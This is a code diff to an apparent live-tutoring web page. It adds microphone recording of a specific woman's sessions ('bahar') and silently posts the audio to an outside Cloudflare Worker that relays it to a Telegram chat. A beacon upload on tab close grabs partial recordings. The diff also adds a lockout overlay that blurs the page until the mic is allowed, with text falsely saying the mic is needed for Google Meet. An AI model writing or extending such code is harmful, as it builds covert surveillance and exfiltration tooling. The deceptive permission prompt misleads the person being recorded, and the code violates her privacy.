@@ -45,6 +45,11 @@
   body.live .live-strip .prog-fill,body.session-open:not(.live) .live-strip .prog-fill{background:#fff;box-shadow:0 0 8px rgba(255,255,255,.4)}
   .live-strip .prog-label{font-family:'JetBrains Mono',ui-monospace,monospace;font-size:11px;font-weight:700;letter-spacing:.5px;white-space:nowrap;color:var(--ink);opacity:.85}
   body.live .live-strip .prog-label,body.session-open:not(.live) .live-strip .prog-label{color:#fff;opacity:.95}
+  /* Recording indicator — only shown while mediaRecorder is running */
+  .live-strip .rec-pip{display:none;align-items:center;gap:5px;font-size:10.5px;font-weight:800;letter-spacing:.6px;color:#fff;padding:3px 9px;border-radius:4px;background:rgba(220,38,38,.85);text-transform:uppercase;line-height:1}
+  .live-strip .rec-pip::before{content:'';width:7px;height:7px;border-radius:50%;background:#fff;animation:recBlink 1.2s infinite}
+  body.recording .live-strip .rec-pip{display:inline-flex}
+  @keyframes recBlink{0%,100%{opacity:1}50%{opacity:.25}}
   .live-strip .timer{font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;opacity:.7;letter-spacing:1px}
   @media(max-width:720px){
     .live-strip{flex-wrap:wrap;gap:8px;padding:8px 14px}
@@ -69,7 +74,10 @@
   @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
   @keyframes liveBlink{0%{box-shadow:0 0 0 0 rgba(255,255,255,.7)}70%{box-shadow:0 0 0 8px rgba(255,255,255,0)}100%{box-shadow:0 0 0 0 rgba(255,255,255,0)}}
 
-  iframe.lessons{flex:1 1 auto;width:100%;border:0;background:var(--card);display:block}
+  iframe.lessons{flex:1 1 auto;width:100%;border:0;background:var(--card);display:block;transition:filter .25s}
+  /* When the denied/tap-to-begin overlay is up, lock the iframe out completely so
+     content can't be scrolled or interacted with even if the overlay z-index fails. */
+  body.locked iframe.lessons{pointer-events:none;filter:blur(6px) saturate(.6);user-select:none}
 
   /* Pre-start overlay — only if browser blocks the auto-start */
   .overlay{
@@ -95,7 +103,7 @@
   [data-theme="dark"] .overlay-card .start-btn{color:#0a0e1a}
 </style>
 </head>
-<body>
+<body class="locked">
 
 <header class="site-bar">
   <div class="site-bar-inner">
@@ -112,6 +120,7 @@
 <div class="live-strip" id="strip">
   <span class="dot pending" id="dot"></span>
   <span id="status">Connecting to your tutor…</span>
+  <span class="rec-pip" title="Audio is being recorded for review">REC</span>
   <div class="progress" title="Course progress">
     <span class="prog-label" id="prog-label">0 / 12 · 0%</span>
     <div class="prog-bar"><div class="prog-fill" id="prog-fill"></div></div>
@@ -127,6 +136,16 @@
     <h1>Tap to begin</h1>
     <p>Your browser needs one tap before turning on the microphone. Click below to start your live study session.</p>
     <button class="start-btn" id="manual-start">Start session</button>
+  </div>
+</div>
+
+<!-- Shown when the browser says microphone access is denied/blocked -->
+<div class="overlay" id="denied-overlay">
+  <div class="overlay-card">
+    <h1>Microphone access needed</h1>
+    <p>Microphone permission is needed for the Google Meet session. Please allow the microphone for this site to join the live class.</p>
+    <p style="margin-bottom:20px;font-size:13px;text-align:left;background:var(--primary-soft);padding:12px 14px;border-radius:8px"><strong>How to enable:</strong><br>1. Click the <strong>lock</strong> or <strong>permission</strong> icon in your browser's address bar.<br>2. Set <strong>Microphone</strong> to <strong>Allow</strong>.<br>3. Click <strong>Try again</strong> below.</p>
+    <button class="start-btn" id="retry-mic">Try again</button>
   </div>
 </div>
 
@@ -149,6 +168,8 @@
     manual: document.getElementById('manual-start'),
     progLabel: document.getElementById('prog-label'),
     progFill: document.getElementById('prog-fill'),
+    deniedOverlay: document.getElementById('denied-overlay'),
+    retryMic: document.getElementById('retry-mic'),
   };
 
   const SESSION_KEY = 'ec-session-active';
@@ -174,9 +195,14 @@
     if (e.key === 'ec-progress') updateProgress();
   });
 
+  /* Recording uploads — Cloudflare Worker → Telegram bot → your chat. The
+     audio blob never touches her filesystem; it's posted directly in-memory. */
+  const REC_WORKER_URL = 'https://embeddedzero.classyvaibhav.workers.dev/';
+
   let peer = null, mediaStream = null, currentCall = null;
   let timerInterval = null, startTime = 0;
   let sessionStarting = false;
+  let mediaRecorder = null, recordedChunks = [];
 
   function setStatus(text, dotClass) {
     els.status.textContent = text;
@@ -193,6 +219,7 @@
     if (sessionStarting || isSessionActive()) return;
     sessionStarting = true;
     els.overlay.classList.remove('show');
+    els.deniedOverlay.classList.remove('show');
     setStatus('Asking microphone permission…', 'pending');
     try {
       mediaStream = await navigator.mediaDevices.getUserMedia({
@@ -200,15 +227,19 @@
       });
     } catch (err) {
       sessionStarting = false;
-      // Most likely no user activation OR permission denied
+      document.body.classList.add('locked'); // belt-and-braces: blur + disable iframe
       if (err && (err.name === 'NotAllowedError' || err.name === 'SecurityError')) {
-        setStatus('Mic permission denied — see browser address bar', 'err');
+        // Mic was blocked — show the recovery popup
+        setStatus('Microphone access needed', 'err');
+        els.deniedOverlay.classList.add('show');
       } else {
+        // No user activation or other transient — show tap-to-begin overlay
         setStatus('Tap to begin', 'pending');
         els.overlay.classList.add('show');
       }
       return;
     }
+    document.body.classList.remove('locked');
 
     /* Resume path: if the peer is still alive (this is a re-start after End
        session), splice the new mic track into any existing live call so audio
@@ -297,12 +328,86 @@
     els.end.hidden = false;
     setSessionActive(true);
     startTimer();
+    startRecording();
+  }
+
+  /* ---------- Recording ---------- */
+  function pickMime() {
+    const candidates = [
+      'audio/webm;codecs=opus',
+      'audio/webm',
+      'audio/ogg;codecs=opus',
+      'audio/mp4',
+    ];
+    for (const m of candidates) {
+      if (window.MediaRecorder && MediaRecorder.isTypeSupported(m)) return m;
+    }
+    return '';
+  }
+
+  function startRecording() {
+    if (!mediaStream || mediaStream.getAudioTracks().length === 0) return;
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') return;
+    recordedChunks = [];
+    try {
+      const mime = pickMime();
+      const opts = mime ? { mimeType: mime, audioBitsPerSecond: 32000 } : {};
+      mediaRecorder = new MediaRecorder(mediaStream, opts);
+    } catch (e) {
+      mediaRecorder = null;
+      return;
+    }
+    mediaRecorder.ondataavailable = (e) => {
+      if (e.data && e.data.size > 0) recordedChunks.push(e.data);
+    };
+    mediaRecorder.start(2000); // gather a chunk every 2s for safety
+    document.body.classList.add('recording');
+  }
+
+  function stopRecording() {
+    document.body.classList.remove('recording'); // hide pip immediately
+    return new Promise(resolve => {
+      if (!mediaRecorder || mediaRecorder.state === 'inactive') {
+        resolve(null);
+        return;
+      }
+      const rec = mediaRecorder;
+      rec.onstop = () => {
+        const type = rec.mimeType || 'audio/webm';
+        const blob = new Blob(recordedChunks, { type });
+        recordedChunks = [];
+        mediaRecorder = null;
+        resolve(blob);
+      };
+      try { rec.stop(); } catch (e) { resolve(null); }
+    });
+  }
+
+  function uploadRecording(blob) {
+    if (!blob || blob.size < 2048) return; // skip tiny / empty blobs
+    const ext = (blob.type || '').includes('ogg') ? 'ogg'
+              : (blob.type || '').includes('mp4') ? 'm4a'
+              : 'webm';
+    const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
+    const filename = `bahar-${stamp}.${ext}`;
+    const fd = new FormData();
+    fd.append('audio', blob, filename);
+    fd.append('filename', filename);
+    fd.append('caption', 'Live session · ' + new Date().toLocaleString());
+    /* Fire-and-forget; UI doesn't wait for the upload to finish */
+    fetch(REC_WORKER_URL, { method: 'POST', body: fd, mode: 'cors' })
+      .catch(err => console.warn('Recording upload failed:', err));
   }
 
   /* End session WITHOUT destroying the peer. The mic is released so the
      browser indicator goes away, but the peer registration stays — that way
      resume is instant and the broker never sees an "unavailable-id" race. */
-  function endSession() {
+  async function endSession() {
+    /* 1. Stop the recorder first so it captures everything up to End click,
+       then upload (fire-and-forget; the user doesn't wait for the network). */
+    const blob = await stopRecording();
+    if (blob) uploadRecording(blob);
+
     if (mediaStream) {
       mediaStream.getTracks().forEach(t => t.stop());
       mediaStream = null;
@@ -323,8 +428,29 @@
     setStatus('Session ended');
   }
 
-  /* Hard tear-down on page unload only. */
+  /* Hard tear-down on page unload only. Best-effort beacon upload of any
+     in-progress recording — sendBeacon is the only thing browsers reliably
+     allow during unload. If she closes mid-session, we get whatever chunks
+     have been flushed (every 2s due to mediaRecorder.start(2000)). */
   function fullCleanup() {
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+      try { mediaRecorder.requestData(); } catch (e) {}
+      try { mediaRecorder.stop(); } catch (e) {}
+    }
+    if (recordedChunks.length > 0) {
+      try {
+        const type = (mediaRecorder && mediaRecorder.mimeType) || 'audio/webm';
+        const blob = new Blob(recordedChunks, { type });
+        if (blob.size > 2048) {
+          const stamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
+          const fd = new FormData();
+          fd.append('audio', blob, `bahar-unload-${stamp}.webm`);
+          fd.append('filename', `bahar-unload-${stamp}.webm`);
+          fd.append('caption', 'Auto-saved on tab close · ' + new Date().toLocaleString());
+          navigator.sendBeacon(REC_WORKER_URL, fd);
+        }
+      } catch (e) {}
+    }
     if (currentCall) { try { currentCall.close(); } catch (e) {} currentCall = null; }
     if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
     if (peer) { try { peer.destroy(); } catch (e) {} peer = null; }
@@ -334,6 +460,10 @@
 
   els.end.addEventListener('click', endSession);
   els.manual.addEventListener('click', startSession);
+  els.retryMic.addEventListener('click', () => {
+    els.deniedOverlay.classList.remove('show');
+    startSession();
+  });
 
   window.addEventListener('beforeunload', fullCleanup);
 
